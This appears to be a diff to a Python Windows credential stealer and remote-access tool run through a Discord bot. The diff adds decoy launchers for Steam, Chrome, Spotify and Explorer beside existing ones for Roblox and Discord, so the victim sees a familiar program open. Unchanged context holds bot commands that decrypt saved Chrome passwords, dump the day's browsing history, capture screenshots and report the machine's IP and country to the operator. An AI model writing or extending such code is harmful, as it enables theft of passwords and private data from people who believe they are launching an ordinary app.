@@ -11,7 +11,6 @@ import subprocess
 import requests
 import socket
 
-
 from datetime import datetime
 
 import win32crypt
@@ -20,46 +19,75 @@ from Cryptodome.Cipher import AES
 import discord
 from discord.ext import commands
 
+# ─────────────────────────────────────────
+# Auto-launch functions
+# ─────────────────────────────────────────
 
 def launch_roblox():
-    # Roblox launching logic
     local_app_data = os.getenv("LOCALAPPDATA")
     versions_path = os.path.join(local_app_data, "Roblox", "Versions")
-
     if not os.path.exists(versions_path):
         raise FileNotFoundError("Roblox Versions directory not found.")
-
-    roblox_path = None
     for folder in os.listdir(versions_path):
         potential = os.path.join(versions_path, folder, "RobloxPlayerBeta.exe")
         if os.path.isfile(potential):
-            roblox_path = potential
-            break
-
-    if not roblox_path:
-        raise FileNotFoundError("RobloxPlayerLauncher.exe not found.")
-
-    subprocess.run(['cmd', '/c', 'start', '', roblox_path], shell=True)
+            subprocess.run(['cmd', '/c', 'start', '', potential], shell=True)
+            print("✅ Roblox launched.")
+            return
+    raise FileNotFoundError("RobloxPlayerBeta.exe not found.")
 
 def launch_discord():
     possible_paths = [
         os.path.join(os.getenv("LOCALAPPDATA", ""), "Discord", "Discord.exe"),
         os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Discord Inc", "Discord.lnk")
     ]
-
     for path in possible_paths:
         if os.path.exists(path):
             subprocess.Popen(f'"{path}"', shell=True)
             print("✅ Discord launched.")
             return
+    print("❌ Discord not found.")
 
-    print("❌ Discord not found in expected locations.")
+def launch_steam():
+    possible_paths = [
+        os.path.join(os.getenv("ProgramFiles(x86)", ""), "Steam", "steam.exe"),
+        os.path.join(os.getenv("ProgramFiles", ""), "Steam", "steam.exe")
+    ]
+    for path in possible_paths:
+        if os.path.exists(path):
+            subprocess.Popen(f'"{path}"', shell=True)
+            print("✅ Steam launched.")
+            return
+    print("❌ Steam not found.")
 
+def launch_chrome():
+    possible_paths = [
+        os.path.join(os.getenv("ProgramFiles(x86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
+        os.path.join(os.getenv("ProgramFiles", ""), "Google", "Chrome", "Application", "chrome.exe")
+    ]
+    for path in possible_paths:
+        if os.path.exists(path):
+            subprocess.Popen(f'"{path}"', shell=True)
+            print("✅ Chrome launched.")
+            return
+    print("❌ Chrome not found.")
 
+def launch_spotify():
+    path = os.path.join(os.getenv("APPDATA", ""), "Spotify", "Spotify.exe")
+    if os.path.exists(path):
+        subprocess.Popen(f'"{path}"', shell=True)
+        print("✅ Spotify launched.")
+    else:
+        print("❌ Spotify not found.")
 
-# ─────────────────────────────────────────────────────────────
+def launch_explorer():
+    subprocess.Popen("explorer")
+    print("✅ File Explorer launched.")
+
+# ─────────────────────────────────────────
 # Chrome Password Extraction (Windows only)
-# ─────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────
+
 def get_master_key():
     local_state_path = os.path.join(
         os.environ['USERPROFILE'],
@@ -104,9 +132,10 @@ def get_chrome_passwords():
     os.remove("Loginvault.db")
     return buf.getvalue().encode()
 
-# ─────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────
 # Chrome History (today only)
-# ─────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────
+
 def get_chrome_history_today(profile: str = "Default"):
     user = os.getenv("USERPROFILE")
     if not user:
@@ -145,10 +174,10 @@ def get_chrome_history_today(profile: str = "Default"):
     name = f"chrome_history_{today_0:%Y-%m-%d}.txt"
     return len(rows), data, name
 
+# ─────────────────────────────────────────
+# IP Functions
+# ─────────────────────────────────────────
 
-#─────────────────────────────────────────────────────────────
-#Ip address
-#─────────────────────────────────────────────────────────────
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -169,7 +198,6 @@ def get_country_and_flag(ip):
     try:
         res = requests.get(f'https://ipinfo.io/{ip}/json').json()
         country_code = res.get('country', 'Unknown')
-        country_name = res.get('country', 'Unknown')
         flag = get_flag_emoji(country_code)
         return country_code, flag
     except Exception:
@@ -179,14 +207,10 @@ def get_flag_emoji(country_code):
     if len(country_code) != 2:
         return '🏳️'
     return chr(ord(country_code[0].upper()) + 127397) + chr(ord(country_code[1].upper()) + 127397)
-#─────────────────────────────────────────────────────────────
 
-# ─────────────────────────────────────────────────────────────
-# Discord Bot
-# ─────────────────────────────────────────────────────────────
-
-# 🔐 NOTE: This is your hardcoded token and owner ID.
-# Make sure you regenerate them before using this in production.
+# ─────────────────────────────────────────
+# Discord Bot Config
+# ─────────────────────────────────────────
 
 TOKEN = "REPLACE_WITH_TOKEN"
 OWNER_ID = "REPLACE_WITH_OWNER_ID"
@@ -195,6 +219,10 @@ LAUNCH_MODE = "REPLACE_WITH_LAUNCH_MODE"
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
+
+# ─────────────────────────────────────────
+# Bot Events and Commands
+# ─────────────────────────────────────────
 
 @bot.event
 async def on_ready():
@@ -207,19 +235,16 @@ async def ip(ctx: commands.Context):
             local_ip = get_local_ip()
             public_ip = get_public_ip()
             country_code, flag = get_country_and_flag(public_ip)
-
             message = (
                 f"📡 **IP Address Info:**\n"
                 f"🖥️ Local IP: `{local_ip}`\n"
                 f"🌐 Public IP: `{public_ip}`\n"
                 f"🏳️ Country: {flag} `{country_code}`"
             )
-
             await ctx.send(message)
-
         except Exception as err:
             await ctx.send(f"⚠️ Error: `{err}`")
-    
+
 @bot.command(name="history")
 async def history(ctx: commands.Context):
     async with ctx.typing():
@@ -228,7 +253,6 @@ async def history(ctx: commands.Context):
             if count == 0:
                 await ctx.send("📭 No browsing history for today.")
                 return
-
             await ctx.send(
                 content=f"📄 Chrome history today ({count} items)",
                 file=discord.File(io.BytesIO(data), filename=fname),
@@ -241,7 +265,6 @@ async def passwords(ctx: commands.Context):
     if str(ctx.author.id) != OWNER_ID:
         await ctx.send("❌ You are not authorized to use this command.")
         return
-
     async with ctx.typing():
         try:
             data = get_chrome_passwords()
@@ -257,12 +280,10 @@ async def screenshot(ctx: commands.Context):
     if str(ctx.author.id) != OWNER_ID:
         await ctx.send("❌ You are not authorized to use this command.")
         return
-
     async with ctx.typing():
         try:
             screenshot_path = "screenshot.png"
             pyautogui.screenshot(screenshot_path)
-            print("📸 Screenshot taken and saved to screenshot.png")
             await ctx.send(
                 content="🖼️ Screenshot of current screen",
                 file=discord.File(screenshot_path)
@@ -270,7 +291,10 @@ async def screenshot(ctx: commands.Context):
             os.remove(screenshot_path)
         except Exception as err:
             await ctx.send(f"⚠️ Screenshot failed: `{err}`")
-            
+
+# ─────────────────────────────────────────
+# Main Entrypoint
+# ─────────────────────────────────────────
 
 if __name__ == "__main__":
     if not TOKEN or not OWNER_ID:
@@ -282,5 +306,15 @@ if __name__ == "__main__":
             launch_discord()
         elif LAUNCH_MODE == "roblox":
             launch_roblox()
+        elif LAUNCH_MODE == "steam":
+            launch_steam()
+        elif LAUNCH_MODE == "chrome":
+            launch_chrome()
+        elif LAUNCH_MODE == "spotify":
+            launch_spotify()
+        elif LAUNCH_MODE == "explorer":
+            launch_explorer()
+        else:
+            print(f"⚠️ Unknown launch mode: {LAUNCH_MODE}")
 
         bot.run(TOKEN)
